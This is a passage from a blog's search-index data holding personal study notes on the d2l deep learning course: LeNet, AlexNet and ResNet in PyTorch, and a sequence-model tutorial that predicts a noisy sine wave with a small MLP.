class=\"code\"><pre><span class=\"line\">X = torch.normal(<span class=\"number\">0</span>, <span class=\"number\">1</span>, (<span class=\"number\">3</span>, <span class=\"number\">3</span>, <span class=\"number\">3</span>))</span><br><span class=\"line\"><span class=\"comment\">#3D,std normal distribution</span></span><br><span class=\"line\">K = torch.normal(<span class=\"number\">0</span>, <span class=\"number\">1</span>, (<span class=\"number\">2</span>, <span class=\"number\">3</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>))</span><br><span class=\"line\"><span class=\"comment\">#4D,std normal distribution</span></span><br><span class=\"line\">Y1 = corr2d_multi_in_out_1x1(X, K)</span><br><span class=\"line\">Y2 = corr2d_multi_in_out(X, K)</span><br><span class=\"line\"><span class=\"keyword\">assert</span> <span class=\"built_in\">float</span>(torch.<span class=\"built_in\">abs</span>(Y1 - Y2).<span class=\"built_in\">sum</span>()) &lt; <span class=\"number\">1e-6</span></span><br></pre></td></tr></table></figure></p>\n","categories":["ML"],"tags":["d2l"]},{"title":"21_LeNet","url":"/2023/03/23/D2L_021_LeNet/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><script src=\"https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.4/MathJax.js?config=TeX-MML-AM_CHTML\" async></script>\n\n\n<h2><span id=\"211-structrue-basics\">21.1 Structrue Basics</span></h2><p>A simplified model block diagram as follows:</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/Screen%20Shot%202023-03-23%20at%209.57.52%20PM.png\" alt=\"Screen Shot 2023-03-23 at 9.57.52 PM\"></p>\n<h2><span id=\"212-realization-in-pytorch\">21.2 Realization in Pytorch</span></h2><h3><span id=\"construct-the-model\">Construct the model</span></h3><p>Use <code>Sequential</code> to add layers.<br><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> torch</span><br><span class=\"line\"><span class=\"keyword\">from</span> torch <span class=\"keyword\">import</span> nn</span><br><span class=\"line\"><span class=\"keyword\">from</span> d2l <span class=\"keyword\">import</span> torch <span class=\"keyword\">as</span> d2l</span><br><span class=\"line\"></span><br><span class=\"line\">net = nn.Sequential(</span><br><span class=\"line\">    nn.Conv2d(<span class=\"number\">1</span>, <span class=\"number\">6</span>, kernel_size=<span class=\"number\">5</span>, padding=<span class=\"number\">2</span>), nn.Sigmoid(),</span><br><span class=\"line\">    <span class=\"comment\"># 5x5 convolutional layer , one channel input, six channel output, 2 padding</span></span><br><span class=\"line\">    nn.AvgPool2d(kernel_size=<span class=\"number\">2</span>, stride=<span class=\"number\">2</span>),</span><br><span class=\"line\">    nn.Conv2d(<span class=\"number\">6</span>, <span class=\"number\">16</span>, kernel_size=<span class=\"number\">5</span>), nn.Sigmoid(),</span><br><span class=\"line\">    nn.AvgPool2d(kernel_size=<span class=\"number\">2</span>, stride=<span class=\"number\">2</span>),</span><br><span class=\"line\">    nn.Flatten(),</span><br><span class=\"line\">    nn.Linear(<span class=\"number\">16</span> * <span class=\"number\">5</span> * <span class=\"number\">5</span>, <span class=\"number\">120</span>), nn.Sigmoid(),</span><br><span class=\"line\">    nn.Linear(<span class=\"number\">120</span>, <span class=\"number\">84</span>), nn.Sigmoid(),</span><br><span class=\"line\">    nn.Linear(<span class=\"number\">84</span>, <span class=\"number\">10</span>))</span><br></pre></td></tr></table></figure></p>\n<h3><span id=\"training\">Training</span></h3><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">batch_size = <span class=\"number\">256</span></span><br><span class=\"line\">train_iter, test_iter = d2l.load_data_fashion_mnist(batch_size=batch_size)</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">evaluate_accuracy_gpu</span>(<span class=\"params\">net, data_iter, device=<span class=\"literal\">None</span></span>):</span> <span class=\"comment\">#@save</span></span><br><span class=\"line\">    <span class=\"string\">&quot;&quot;&quot;使用GPU计算模型在数据集上的精度&quot;&quot;&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"built_in\">isinstance</span>(net, nn.Module):</span><br><span class=\"line\">        net.<span class=\"built_in\">eval</span>()  <span class=\"comment\"># 设置为评估模式</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> device:</span><br><span class=\"line\">            device = <span class=\"built_in\">next</span>(<span class=\"built_in\">iter</span>(net.parameters())).device</span><br><span class=\"line\">    <span class=\"comment\"># 正确预测的数量，总预测的数量</span></span><br><span class=\"line\">    metric = d2l.Accumulator(<span class=\"number\">2</span>)</span><br><span class=\"line\">    <span class=\"keyword\">with</span> torch.no_grad():</span><br><span class=\"line\">        <span class=\"keyword\">for</span> X, y <span class=\"keyword\">in</span> data_iter:</span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"built_in\">isinstance</span>(X, <span class=\"built_in\">list</span>):</span><br><span class=\"line\">                <span class=\"comment\"># BERT微调所需的（之后将介绍）</span></span><br><span class=\"line\">                X = [x.to(device) <span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> X]</span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                X = X.to(device)</span><br><span class=\"line\">            y = y.to(device)</span><br><span class=\"line\">            metric.add(d2l.accuracy(net(X), y), y.numel())</span><br><span class=\"line\">    <span class=\"keyword\">return</span> metric[<span class=\"number\">0</span>] / metric[<span class=\"number\">1</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">train_ch6</span>(<span class=\"params\">net, train_iter, test_iter, num_epochs, lr, device</span>):</span></span><br><span class=\"line\">    <span class=\"string\">&quot;&quot;&quot;用GPU训练模型(在第六章定义)&quot;&quot;&quot;</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">init_weights</span>(<span class=\"params\">m</span>):</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"built_in\">type</span>(m) == nn.Linear <span class=\"keyword\">or</span> <span class=\"built_in\">type</span>(m) == nn.Conv2d:</span><br><span class=\"line\">            nn.init.xavier_uniform_(m.weight)</span><br><span class=\"line\">    net.apply(init_weights)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;training on&#x27;</span>, device)</span><br><span class=\"line\">    net.to(device)</span><br><span class=\"line\">    optimizer = torch.optim.SGD(net.parameters(), lr=lr)</span><br><span class=\"line\">    loss = nn.CrossEntropyLoss()</span><br><span class=\"line\">    <span class=\"comment\">#animator = d2l.Animator(xlabel=&#x27;epoch&#x27;, xlim=[1, num_epochs],legend=[&#x27;train loss&#x27;, &#x27;train acc&#x27;, &#x27;test acc&#x27;])</span></span><br><span class=\"line\">    timer, num_batches = d2l.Timer(), <span class=\"built_in\">len</span>(train_iter)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> epoch <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(num_epochs):</span><br><span class=\"line\">        <span class=\"comment\"># 训练损失之和，训练准确率之和，样本数</span></span><br><span class=\"line\">        metric = d2l.Accumulator(<span class=\"number\">3</span>)</span><br><span class=\"line\">        net.train()</span><br><span class=\"line\">        <span class=\"keyword\">for</span> i, (X, y) <span class=\"keyword\">in</span> <span class=\"built_in\">enumerate</span>(train_iter):</span><br><span class=\"line\">            timer.start()</span><br><span class=\"line\">            optimizer.zero_grad()</span><br><span class=\"line\">            X, y = X.to(device), y.to(device)</span><br><span class=\"line\">            y_hat = net(X)</span><br><span class=\"line\">            l = loss(y_hat, y)</span><br><span class=\"line\">            l.backward()</span><br><span class=\"line\">            optimizer.step()</span><br><span class=\"line\">            <span class=\"keyword\">with</span> torch.no_grad():</span><br><span class=\"line\">                metric.add(l * X.shape[<span class=\"number\">0</span>], d2l.accuracy(y_hat, y), X.shape[<span class=\"number\">0</span>])</span><br><span class=\"line\">            timer.stop()</span><br><span class=\"line\">            train_l = metric[<span class=\"number\">0</span>] / metric[<span class=\"number\">2</span>]</span><br><span class=\"line\">            train_acc = metric[<span class=\"number\">1</span>] / metric[<span class=\"number\">2</span>]</span><br><span class=\"line\">        test_acc = evaluate_accuracy_gpu(net, test_iter)</span><br><span class=\"line\">        <span class=\"comment\">#animator.add(epoch + 1, (None, None, test_acc))</span></span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">f&#x27;loss <span class=\"subst\">&#123;train_l:<span class=\"number\">.3</span>f&#125;</span>, train acc <span class=\"subst\">&#123;train_acc:<span class=\"number\">.3</span>f&#125;</span>, &#x27;</span></span><br><span class=\"line\">          <span class=\"string\">f&#x27;test acc <span class=\"subst\">&#123;test_acc:<span class=\"number\">.3</span>f&#125;</span>&#x27;</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">f&#x27;<span class=\"subst\">&#123;metric[<span class=\"number\">2</span>] * num_epochs / timer.<span class=\"built_in\">sum</span>():<span class=\"number\">.1</span>f&#125;</span> examples/sec &#x27;</span></span><br><span class=\"line\">          <span class=\"string\">f&#x27;on <span class=\"subst\">&#123;<span class=\"built_in\">str</span>(device)&#125;</span>&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">lr, num_epochs = <span class=\"number\">0.9</span>, <span class=\"number\">10</span></span><br><span class=\"line\">train_ch6(net, train_iter, test_iter, num_epochs, lr, d2l.try_gpu())</span><br></pre></td></tr></table></figure>\n<p>The result from colab(gpu) and mac intel cpu respectively.<br>Orz.<br>5 times faster… </p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/Screen%20Shot%202023-03-24%20at%2010.48.51%20AM.png\" alt=\"Screen Shot 2023-03-24 at 10.48.51 AM\"></p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/Screen%20Shot%202023-03-24%20at%2010.49.00%20AM.png\" alt=\"Screen Shot 2023-03-24 at 10.49.00 AM\"></p>\n","categories":["ML"],"tags":["d2l"]},{"title":"22_Modern_CNN","url":"/2023/03/21/D2L_022_Modern_CNN/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><p>From traditional machine learning to the modern deep neurai network, hthe most significantly profound progession is the source of  the Featrues.<br>In the past, the learning featrues come from the delicate, well constructed featrues which made by feature engineering, but the prosperity of deep convolutional neural network renders the featrue extracture become automatically.<br>“The features themselves should be learned” is a core idea of modern deep neural network.</p>\n<h1><span id=\"221-alexnet\">22.1 AlexNet</span></h1><p><a href=\"https://papers.nips.cc/paper/2012/file/c399862d3b9d6b76c8436e924a68c45b-Paper.pdf\">paper</a></p>\n<h2><span id=\"2211-basics\">22.1.1 Basics</span></h2><p>From LeNet to Alexnet</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/Screen%20Shot%202023-03-24%20at%2012.00.07%20PM.png\" alt=\"Screen Shot 2023-03-24 at 12.00.07 PM\"></p>\n<p>The structrue somewhat similar with the LeNet, but deeper and bigger,also, it use the ReLu as an activate function,and use a MaxPooling to increase the gradient.</p>\n<h2><span id=\"2212-realization\">22.1.2 Realization</span></h2><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">net = nn.Sequential(</span><br><span class=\"line\">    <span class=\"comment\"># 这里使用一个11*11的更大窗口来捕捉对象。</span></span><br><span class=\"line\">    <span class=\"comment\"># 同时，步幅为4，以减少输出的高度和宽度。</span></span><br><span class=\"line\">    <span class=\"comment\"># 另外，输出通道的数目远大于LeNet</span></span><br><span class=\"line\">    nn.Conv2d(<span class=\"number\">1</span>, <span class=\"number\">96</span>, kernel_size=<span class=\"number\">11</span>, stride=<span class=\"number\">4</span>, padding=<span class=\"number\">1</span>), nn.ReLU(),</span><br><span class=\"line\">    nn.MaxPool2d(kernel_size=<span class=\"number\">3</span>, stride=<span class=\"number\">2</span>),</span><br><span class=\"line\">    <span class=\"comment\"># 减小卷积窗口，使用填充为2来使得输入与输出的高和宽一致，且增大输出通道数</span></span><br><span class=\"line\">    nn.Conv2d(<span class=\"number\">96</span>, <span class=\"number\">256</span>, kernel_size=<span class=\"number\">5</span>, padding=<span class=\"number\">2</span>), nn.ReLU(),</span><br><span class=\"line\">    nn.MaxPool2d(kernel_size=<span class=\"number\">3</span>, stride=<span class=\"number\">2</span>),</span><br><span class=\"line\">    <span class=\"comment\"># 使用三个连续的卷积层和较小的卷积窗口。</span></span><br><span class=\"line\">    <span class=\"comment\"># 除了最后的卷积层，输出通道的数量进一步增加。</span></span><br><span class=\"line\">    <span class=\"comment\"># 在前两个卷积层之后，汇聚层不用于减少输入的高度和宽度</span></span><br><span class=\"line\">    nn.Conv2d(<span class=\"number\">256</span>, <span class=\"number\">384</span>, kernel_size=<span class=\"number\">3</span>, padding=<span class=\"number\">1</span>), nn.ReLU(),</span><br><span class=\"line\">    nn.Conv2d(<span class=\"number\">384</span>, <span class=\"number\">384</span>, kernel_size=<span class=\"number\">3</span>, padding=<span class=\"number\">1</span>), nn.ReLU(),</span><br><span class=\"line\">    nn.Conv2d(<span class=\"number\">384</span>, <span class=\"number\">256</span>, kernel_size=<span class=\"number\">3</span>, padding=<span class=\"number\">1</span>), nn.ReLU(),</span><br><span class=\"line\">    nn.MaxPool2d(kernel_size=<span class=\"number\">3</span>, stride=<span class=\"number\">2</span>),</span><br><span class=\"line\">    nn.Flatten(),</span><br><span class=\"line\">    <span class=\"comment\"># 这里，全连接层的输出数量是LeNet中的好几倍。使用dropout层来减轻过拟合</span></span><br><span class=\"line\">    nn.Linear(<span class=\"number\">6400</span>, <span class=\"number\">4096</span>), nn.ReLU(),</span><br><span class=\"line\">    nn.Dropout(p=<span class=\"number\">0.5</span>),</span><br><span class=\"line\">    nn.Linear(<span class=\"number\">4096</span>, <span class=\"number\">4096</span>), nn.ReLU(),</span><br><span class=\"line\">    nn.Dropout(p=<span class=\"number\">0.5</span>),</span><br><span class=\"line\">    <span class=\"comment\"># 最后是输出层。由于这里使用Fashion-MNIST，所以用类别数为10，而非论文中的1000</span></span><br><span class=\"line\">    nn.Linear(<span class=\"number\">4096</span>, <span class=\"number\">10</span>))</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/Screen%20Shot%202023-03-24%20at%208.32.39%20PM.png\" alt=\"Screen Shot 2023-03-24 at 8.32.39 PM\"></p>\n<p>batch_size = 64<br><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/Screen%20Shot%202023-03-24%20at%208.42.10%20PM.png\" alt=\"Screen Shot 2023-03-24 at 8.42.10 PM\"></p>\n<h1><span id=\"222-resnet\">22.2 ResNet</span></h1><p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/Screen%20Shot%202023-03-24%20at%209.04.11%20PM.png\" alt=\"Screen Shot 2023-03-24 at 9.04.11 PM\"></p>\n<p>Cool<br><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/Screen%20Shot%202023-03-24%20at%2010.05.20%20PM.png\" alt=\"Screen Shot 2023-03-24 at 10.05.20 PM\"></p>\n","categories":["ML"],"tags":["d2l"]},{"title":"23_Sequence_Model","url":"/2023/03/27/D2L_023_Sequential_Model/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><script src=\"https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.4/MathJax.js?config=TeX-MML-AM_CHTML\" async></script>\n\n<h2><span id=\"231-preface\">23.1 Preface</span></h2><p>So this module involving the natrue language processing problem.<br>And the first basics are sequential model.</p>\n<h2><span id=\"232-description\">23.2 Description</span></h2><p>Arguablely, time is a important factor in a lot of problems, for example ,if we want to predict the performance of the sale of a film, there are large amounts of  factors which consider time as a key variable.<br>Silmilarly, it’s more difficult to predict the price of a stake at the next day than yesterday, and all of the music, audio, text ,etc, are relate with time strongly,if we detach the time element , items will become meaningless.</p>\n<p>So how can we analyze the time element mathematically?</p>\n<h2><span id=\"233-autoregressive-model\">23.3 Autoregressive Model</span></h2><p>Asume several dependent variables x1,x2…xt,<br>then :</p>\n<script type=\"math/tex; mode=display\">\np(\\mathbf{x}) = p(x_{1}) \\cdot{p(x_{2}|x_{1})}\\cdot{p(x_{3}|x_{1},x_{2})}\\dots p(x_{T}|x_{T-1}\\cdot x_{T-2}\\dots x_{1})</script><p>=</p>\n<script type=\"math/tex; mode=display\">\np(\\mathbf{x}) = p(x_{T}) \\cdot{p(x_{T-1}|x_{T})}\\cdot{p(x_{T-2}|x_{T-1},x_{T})}\\dots p(x_{1}|x_{T}\\cdot x_{T-1}\\dots x_{1})</script><p>So what we want to predict is the values at the t time point,which is </p>\n<script type=\"math/tex; mode=display\">\np(x_{T}|x_{T-1}\\cdot x_{T-2}\\dots x_{1})</script><p>we can derive the model using the former datas</p>\n<script type=\"math/tex; mode=display\">\np(x_{T}|x_{T-1}\\cdot x_{T-2}\\dots x_{1}) = p(x_{T}|f(x_{1},\\dots x_{t-1}))</script><p>and the prediction is a sample itself, thus we can call it the autoregression model.</p>\n<h3><span id=\"2331-markov-models\">23.3.1  Markov Models</span></h3><p>Markov Model assumes that the time point t only relates with the specific time period , rather than relates with all of the past datas.<br>For example, the time 5 may only relates with time 3 and time 4, we in that condition ,we have no need to care about the time 1 and 2 anymore.</p>\n<h3><span id=\"2332-latent\">23.3.2 Latent</span></h3><h2><span id=\"234-realization-in-pytorch\">23.4 Realization in Pytorch</span></h2><h3><span id=\"2341-generate-sequence\">23.4.1 Generate Sequence</span></h3><p>Generate some sequential data use the sine function a nd some additive noise.<br><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">%matplotlib inline</span><br><span class=\"line\"><span class=\"keyword\">import</span> torch</span><br><span class=\"line\"><span class=\"keyword\">from</span> torch <span class=\"keyword\">import</span> nn</span><br><span class=\"line\"><span class=\"keyword\">from</span> d2l <span class=\"keyword\">import</span> torch <span class=\"keyword\">as</span> d2l</span><br><span class=\"line\"></span><br><span class=\"line\">T = <span class=\"number\">1000</span>  <span class=\"comment\"># 1000 point totally</span></span><br><span class=\"line\">time = torch.arange(<span class=\"number\">1</span>, T + <span class=\"number\">1</span>, dtype=torch.float32)</span><br><span class=\"line\"><span class=\"comment\"># sine function and noise</span></span><br><span class=\"line\">x = torch.sin(<span class=\"number\">0.01</span> * time) + torch.normal(<span class=\"number\">0</span>, <span class=\"number\">0.2</span>, (T,))</span><br><span class=\"line\">d2l.plot(time, [x], <span class=\"string\">&#x27;time&#x27;</span>, <span class=\"string\">&#x27;x&#x27;</span>, xlim=[<span class=\"number\">1</span>, <span class=\"number\">1000</span>], figsize=(<span class=\"number\">6</span>, <span class=\"number\">3</span>))</span><br></pre></td></tr></table></figure></p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/Screen%20Shot%202023-03-27%20at%207.22.15%20PM.png\" alt=\"Screen Shot 2023-03-27 at 7.22.15 PM\"></p>\n<p>For the given sine sequence with some noise , if we can predict the future data?</p>\n<h3><span id=\"2342-generate-the-featrue-and-label\">23.4.2 Generate The Featrue And Label</span></h3><p>Use a simple MLP to construce the model.And the key factor is the construction of the featrue and labels:<br>Using the idea of Markov model, we assume that: for a n length sequence, we consider the 1~(n-1) time point value as the featrue to predict, so the n th time point value is the prediction value, then we need to predict the n+1 time point value, so we so the (2 - n) time points value as the featrues to predict..and so on.<br>So we need to redivide the x in to the form likes:<br>x[1,2,3,4,5,6,7,…n] —&gt; x[1,2,3,4],[2,3,4,5],[3,4,5,6]…<br>and the label is 5,6,7,8,…<br>Derive it in pytorch:</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">tau = <span class=\"number\">4</span></span><br><span class=\"line\"><span class=\"comment\">#each T numbers of  samples ,use the first four samples as the featrues,and the 5 th value need to be predicted .</span></span><br><span class=\"line\">features = torch.zeros((T - tau, tau))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(tau):</span><br><span class=\"line\">    features[:, i] = x[i: T - tau + i]</span><br><span class=\"line\">    </span><br><span class=\"line\">labels = x[tau:].reshape((-<span class=\"number\">1</span>, <span class=\"number\">1</span>))</span><br><span class=\"line\"><span class=\"comment\"># for the fisrt 5 datas, x[5] is the labels, for the second ,x[6] is the labels ,etc.</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/Screen%20Shot%202023-03-27%20at%208.29.08%20PM.png\" alt=\"Screen Shot 2023-03-27 at 8.29.08 PM\"><br><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/Screen%20Shot%202023-03-27%20at%208.29.26%20PM.png\" alt=\"Screen Shot 2023-03-27 at 8.29.26 PM\"></p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">batch_size, n_train = <span class=\"number\">16</span>, <span class=\"number\">600</span></span><br><span class=\"line\"><span class=\"comment\"># 只有前n_train个样本用于训练</span></span><br><span class=\"line\">train_iter = d2l.load_array((features[:n_train], labels[:n_train]),</span><br><span class=\"line\">                            batch_size, is_train=<span class=\"literal\">True</span>)</span><br><span class=\"line\">batch_size, n_train = <span class=\"number\">16</span>, <span class=\"number\">600</span></span><br><span class=\"line\"><span class=\"comment\"># 只有前n_train个样本用于训练</span></span><br><span class=\"line\">train_iter = d2l.load_array((features[:n_train], labels[:n_train]),</span><br><span class=\"line\">                            batch_size, is_train=<span class=\"literal\">True</span>)</span><br><span class=\"line\"><span class=\"comment\"># 初始化网络权重的函数</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">init_weights</span>(<span class=\"params\">m</span>):</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"built_in\">type</span>(m) == nn.Linear:</span><br><span class=\"line\">        nn.init.xavier_uniform_(m.weight)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 一个简单的多层感知机</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_net</span>():</span></span><br><span class=\"line\">    net = nn.Sequential(nn.Linear(<span class=\"number\">4</span>, <span class=\"number\">10</span>),</span><br><span class=\"line\">                        nn.ReLU(),</span><br><span class=\"line\">                        nn.Linear(<span class=\"number\">10</span>, <span class=\"number\">1</span>))</span><br><span class=\"line\">    net.apply(init_weights)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> net</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 平方损失。注意：MSELoss计算平方误差时不带系数1/2</span></span><br><span class=\"line\">loss = nn.MSELoss(reduction=<span class=\"string\">&#x27;none&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">train</span>(<span class=\"params\">net, train_iter, loss, epochs, lr</span>):</span></span><br><span class=\"line\">    trainer = torch.optim.Adam(net.parameters(), lr)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> epoch <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(epochs):</span><br><span class=\"line\">        <span class=\"keyword\">for</span> X, y <span class=\"keyword\">in</span> train_iter:</span><br><span class=\"line\">            trainer.zero_grad()</span><br><span class=\"line\">            l = loss(net(X), y)</span><br><span class=\"line\">            l.<span class=\"built_in\">sum</span>().backward()</span><br><span class=\"line\">            trainer.step()</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">f&#x27;epoch <span class=\"subst\">&#123;epoch + <span class=\"number\">1</span>&#125;</span>, &#x27;</span></span><br><span class=\"line\">              <span class=\"string\">f&#x27;loss: <span class=\"subst\">&#123;d2l.evaluate_loss(net, train_iter, loss):f&#125;</span>&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">net = get_net()</span><br><span class=\"line\">train(net, train_iter, loss, <span class=\"number\">5</span>, <span class=\"number\">0.01</span>)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/Screen%20Shot%202023-03-27%20at%208.31.03%20PM.png\" alt=\"Screen Shot 2023-03-27 at 8.31.03 PM\"></p>\n<h3><span id=\"2343-prediction\">23.4.3 Prediction</span></h3><h4><span id=\"23431-one-step\">23.4.3.1 One-Step</span></h4><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">onestep_preds = net(features)</span><br><span class=\"line\">d2l.plot([time, time[tau:]],</span><br><span class=\"line\">         [x.detach().numpy(), onestep_preds.detach().numpy()], <span class=\"string\">&#x27;time&#x27;</span>,</span><br><span class=\"line\">         <span class=\"string\">&#x27;x&#x27;</span>, legend=[<span class=\"string\">&#x27;data&#x27;</span>, <span class=\"string\">&#x27;1-step preds&#x27;</span>], xlim=[<span class=\"number\">1</span>, <span class=\"number\">1000</span>],</span><br><span class=\"line\">         figsize=(<span class=\"number\">6</span>, <span class=\"number\">3</span>))</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/Screen%20Shot%202023-03-27%20at%208.33.37%20PM.png\" alt=\"Screen Shot 2023-03-27 at 8.33.37 PM\"></p>\n<p>Can’t predicte the noise.</p>\n<h4><span id=\"23432-multi-step\">23.4.3.2 Multi-Step</span></h4><p>So the one-step always use the true value to predict ,what will happen if we use the prediction value as a sample to achive a multi-step prediction?</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">multistep_preds = torch.zeros(T)</span><br><span class=\"line\">multistep_preds[: n_train + tau] = x[: n_train + tau]</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(n_train + tau, T):</span><br><span class=\"line\">    multistep_preds[i] = net(</span><br><span class=\"line\">        multistep_preds[i - tau:i].reshape((<span class=\"number\">1</span>, -<span class=\"number\">1</span>)))</span><br><span class=\"line\"></span><br><span class=\"line\">d2l.plot([time, time[tau:], time[n_train + tau:]],</span><br><span class=\"line\">         [x.detach().numpy(), onestep_preds.detach().numpy(),</span><br><span class=\"line\">          multistep_preds[n_train + tau:].detach().numpy()], <span class=\"string\">&#x27;time&#x27;</span>,</span><br><span class=\"line\">         <span class=\"string\">&#x27;x&#x27;</span>, legend=[<span class=\"string\">&#x27;data&#x27;</span>, <span class=\"string\">&#x27;1-step preds&#x27;</span>, <span class=\"string\">&#x27;multistep preds&#x27;</span>],</span><br><span class=\"line\">         xlim=[<span class=\"number\">1</span>, <span class=\"number\">1000</span>], figsize=(<span class=\"number\">6</span>, <span class=\"number\">3</span>))</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/Screen%20Shot%202023-03-27%20at%2010.01.39%20PM.png\" alt=\"Screen Shot 2023-03-27 at 10.01.39 PM\"></p>\n<p>We can examinate our predicted value , obviously it is not a ideal curve.What causes this outcome ?<br>In fact , each steps will generate some error, and if we use the prediction value as a input, the errors will accumulate to a huge scale, leading to the bad results.</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">max_steps = <span class=\"number\">64</span></span><br><span class=\"line\"></span><br><span class=\"line\">features = torch.zeros((T - tau - max_steps + <span class=\"number\">1</span>, tau + max_steps))</span><br><span class=\"line\"><span class=\"comment\"># 列i（i&lt;tau）是来自x的观测，其时间步从（i）到（i+T-tau-max_steps+1）</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(tau):</span><br><span class=\"line\">    features[:, i] = x[i: i + T - tau - max_steps + <span class=\"number\">1</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 列i（i&gt;=tau）是来自（i-tau+1）步的预测，其时间步从（i）到（i+T-tau-max_steps+1）</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(tau, tau + max_steps):</span><br><span class=\"line\">    features[:, i] = net(features[:, i - tau:i]).reshape(-<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">steps = (<span class=\"number\">1</span>, <span class=\"number\">4</span>, <span class=\"number\">16</span>, <span class=\"number\">64</span>)</span><br><span class=\"line\">d2l.plot([time[tau + i - <span class=\"number\">1</span>: T - max_steps + i] <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> steps],</span><br><span class=\"line\">         [features[:, tau + i - <span class=\"number\">1</span>].detach().numpy() <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> steps], <span class=\"string\">&#x27;time&#x27;</span>, <span class=\"string\">&#x27;x&#x27;</span>,</span><br><span class=\"line\">         legend=[<span class=\"string\">f&#x27;<span class=\"subst\">&#123;i&#125;</span>-step preds&#x27;</span> <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> steps], xlim=[<span class=\"number\">5</span>, <span 